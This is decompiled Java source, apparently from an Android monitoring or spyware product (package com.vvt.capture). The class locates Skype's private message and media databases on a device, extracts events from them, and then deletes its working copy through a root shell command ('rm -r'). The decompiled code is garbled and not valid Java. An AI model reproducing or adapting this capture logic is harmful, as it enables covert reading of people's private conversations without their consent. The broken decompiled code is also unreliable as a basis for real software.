package com.vvt.capture.e.b.b;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class c
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private String d;
  private com.vvt.base.b e;
  private long f = -1;
  
  public c(String paramString, com.vvt.base.b paramb)
  {
    this.d = paramString;
    this.e = paramb;
  }
  
  private String a(String paramString)
  {
    String str1 = d();
    String str2 = this.d;
    String str3 = this.e.f();
    return d.a(paramString, "cache_db.db", str1, "media_cache_db.db", str2, str3);
  }
  
  private String a(String paramString1, String paramString2)
  {
    String str1 = d();
    String str2 = this.e.f();
    return d.a(paramString1, str1, "main.db", paramString2, str2);
  }
  
  private String b(String paramString1, String paramString2)
  {
    String str1 = d();
    String str2 = this.e.f();
    return d.a(paramString1, str1, "cache_db.db", paramString2, str2);
  }
  
  private void c()
  {
    String str1 = d();
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = c;
        if (!bool) {}
      }
    }
  }
  
  private String d()
  {
    return p.a(this.d, "skype");
  }
  
  public g a()
  {
    l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    for (;;)
    {
      try
      {
        localObject1 = this.d;
        localObject1 = d.a((String)localObject1);
        String str1 = d();
        Object localObject2 = this.d;
        Object localObject3 = this.e;
        localObject3 = ((com.vvt.base.b)localObject3).f();
        localObject2 = d.a((String)localObject2, (String)localObject1, str1, (String)localObject3);
        if (localObject2 == null) {
          continue;
        }
        str2 = a((String)localObject2, (String)localObject1);
        j = com.vvt.ag.b.a(str2);
        if (j == 0)
        {
          localObject2 = this.e;
          localObject2 = ((com.vvt.base.b)localObject2).f();
          localObject1 = d.b((String)localObject1, str1, (String)localObject2);
          boolean bool3 = com.vvt.ag.b.a((String)localObject1);
          if (!bool3)
          {
            localObject1 = com.vvt.capture.e.d.c((String)localObject1);
            if (localObject1 != null)
            {
              long l2 = com.vvt.capture.e.d.a(str2);
              bool1 = false;
              localObject1 = null;
              l3 = l2;
              j = 0;
              localObject2 = null;
              boolean bool4 = l3 < l1;
              if (bool4) {
                continue;
              }
              int k = 10;
              if (j >= k) {
                continue;
              }
              l4 = 6000L;
            }
          }
        }
      }
      catch (Exception localException1)
      {
        Object localObject1;
        String str2;
        long l4;
        int i;
        boolean bool5;
        boolean bool2;
        FxSimpleEventReference localFxSimpleEventReference;
        long l3 = l1;
        int j = c;
        if (j == 0) {
          continue;
        }
        continue;
        this.f = l3;
        continue;
        l3 = l1;
        continue;
      }
      try
      {
        SystemClock.sleep(l4);
        l4 = com.vvt.capture.e.d.a(str2);
        i = j + 1;
        j = i;
        l3 = l4;
      }
      catch (Exception localException2) {}
    }
    l3 = l1;
    c();
    bool5 = l3 < l1;
    if (!bool5)
    {
      bool2 = b;
      if (bool2) {}
      l3 = this.f;
      localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
      localFxSimpleEventReference.<init>();
      localObject1 = Long.valueOf(l3);
      localFxSimpleEventReference.setReference((Long)localObject1);
      bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
    }
  }
  
  public List a(int paramInt)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = this.d;
      String str1 = d.a((String)localObject1);
      String str2 = d();
      localObject1 = this.d;
      Object localObject2 = this.e;
      localObject2 = ((com.vvt.base.b)localObject2).f();
      localObject1 = d.a((String)localObject1, str1, str2, (String)localObject2);
      localObject2 = this.d;
      Object localObject3 = this.e;
      localObject3 = ((com.vvt.base.b)localObject3).f();
      localObject2 = d.b((String)localObject2, str1, str2, (String)localObject3);
      if (localObject1 != null)
      {
        int i = ((String)localObject1).length();
        if (i > 0)
        {
          localObject1 = a((String)localObject1, str1);
          localObject3 = this.e;
          localObject3 = ((com.vvt.base.b)localObject3).f();
          str2 = d.b(str1, str2, (String)localObject3);
          String str3 = a((String)localObject2);
          localObject2 = com.vvt.capture.e.d.c(str2);
          localObject2 = com.vvt.n.a.e.b.d((String)localObject2);
          String str4 = b((String)localObject2, str1);
          boolean bool2 = a;
          if (bool2) {}
          bool2 = a;
          if (bool2) {}
          bool2 = a;
          if (bool2) {}
          bool2 = a;
          if (bool2) {}
          bool2 = a;
          if (bool2) {}
          localObject2 = this.d;
          com.vvt.base.b localb = this.e;
          boolean bool3 = true;
          i = paramInt;
          localObject1 = com.vvt.capture.e.d.a((String)localObject1, str2, (String)localObject2, paramInt, localb, str3, bool3, str4, str1);
          localArrayList.addAll((Collection)localObject1);
          bool1 = a;
          if (bool1) {}
          c();
        }
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof FxSimpleEventReference;
    if (bool1)
    {
      bool1 = paramg2 instanceof FxSimpleEventReference;
      if (!bool1) {}
    }
    try
    {
      Object localObject1 = ((g)paramg1).getReference();
      localObject1 = (Long)localObject1;
      long l1 = ((Long)localObject1).longValue();
      localObject1 = ((g)paramg2).getReference();
      localObject1 = (Long)localObject1;
      long l2 = ((Long)localObject1).longValue();
      localObject1 = this.d;
      String str1 = d.a((String)localObject1);
      String str2 = d();
      localObject1 = this.d;
      Object localObject2 = this.e;
      localObject2 = ((com.vvt.base.b)localObject2).f();
      localObject2 = d.a((String)localObject1, str1, str2, (String)localObject2);
      localObject1 = this.d;
      Object localObject3 = this.e;
      localObject3 = ((com.vvt.base.b)localObject3).f();
      localObject3 = d.b((String)localObject1, str1, str2, (String)localObject3);
      if (localObject2 != null)
      {
        int i = ((String)localObject2).length();
        if (i > 0)
        {
          localObject1 = a(str2, (String)localObject2);
          Object localObject4 = this.e;
          localObject4 = ((com.vvt.base.b)localObject4).f();
          str2 = d.b(str1, str2, (String)localObject4);
          localObject4 = a((String)localObject3);
          localObject3 = "%s/%s";
          int j = 2;
          Object[] arrayOfObject = new Object[j];
          String str3 = null;
          arrayOfObject[0] = localObject2;
          boolean bool3 = true;
          str3 = "media_messaging/%s/asyncdb";
          arrayOfObject[bool3] = str3;
          localObject2 = String.format((String)localObject3, arrayOfObject);
          str3 = b((String)localObject2, str1);
          bool3 = a;
          if (bool3) {}
          bool3 = a;
          if (bool3) {}
          bool3 = a;
          if (bool3) {}
          bool3 = a;
          if (bool3) {}
          bool3 = a;
          if (bool3) {}
          localObject2 = this.d;
          localObject3 = this.e;
          j = 1;
          localObject1 = com.vvt.capture.e.d.a((String)localObject1, str2, (String)localObject2, l1, l2, (com.vvt.base.b)localObject3, (String)localObject4, j, str3, str1);
          localArrayList.addAll((Collection)localObject1);
          bool2 = a;
          if (bool2) {}
          c();
        }
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = c;
        if (!bool2) {}
      }
    }
    bool2 = a;
    if (bool2) {}
    return localArrayList;
  }
  
  public void b()
  {
    this.f = -1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/e/removeFromPath/removeFromPath/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */